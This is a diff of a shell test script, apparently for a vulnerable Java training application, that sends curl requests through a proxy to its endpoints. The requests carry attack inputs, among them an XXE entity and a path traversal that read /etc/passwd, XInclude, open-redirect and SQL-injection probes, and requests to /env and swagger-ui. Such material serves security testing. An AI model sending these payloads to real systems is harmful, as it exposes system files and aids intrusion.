@@ -46,12 +46,20 @@ curl -x "http://${PS}:10802" "http://${IP}:8001/sqli/mybatis/vuln01?username=joy
 # redirect
 curl -x "http://${PS}:10802" "http://${IP}:8001/urlRedirect/redirect?url=http://www.baidu.com" -H "Cookie: $COOKIE"
 
-# # xxe url
-# curl -X POST -x "http://${PS}:10802" "http://${IP}:8001/xxe/Digester/vuln" -H "Content-Type: application/xml" -H "Cookie: $COOKIE" --data '<?xml version='\''1.0'\''?>
-# <data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://publicServer.com/file.xml"></xi:include></data>'
+# xxe url
+curl -X POST -x "http://${PS}:10802" "http://${IP}:8001/xxe/Digester/vuln" -H "Content-Type: application/xml" -H "Cookie: $COOKIE" --data '<?xml version='\''1.0'\''?><data xmlns:xi="https://www.baidu.com"><xi:include href="https://www.baidu.com"></xi:include></data>'
 
 # xxe file
-curl -X POST -x "http://${PS}:10802" "http://${IP}:8001/xxe/Digester/vuln" -H "Content-Type: application/xml" -H "Cookie: $COOKIE" --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY name SYSTEM "file:///etc//passwd">]><comment><text>&name;</text></comment>'
+#curl -X POST -x "http://${PS}:10802" "http://${IP}:8001/xxe/Digester/vuln" -H "Content-Type: application/xml" -H "Cookie: $COOKIE" --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY name SYSTEM "file:///etc//passwd">]><comment><text>&name;</text></comment>'
+
+# poc
+curl -x "http://${PS}:10802" "http://${IP}:8001/index" -H "Cookie: $COOKIE"
+
+# env
+curl -x "http://${PS}:10802" "http://${IP}:8001/env" -H "Cookie: $COOKIE"
+
+# env
+curl -x "http://${PS}:10802" "http://${IP}:8001/swagger-ui.html" -H "Cookie: $COOKIE"
 
 # path_traversal no
 curl -x "http://${PS}:10802" "http://${IP}:8001/path_traversal/vul?filepath=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" -H "Cookie: $COOKIE"
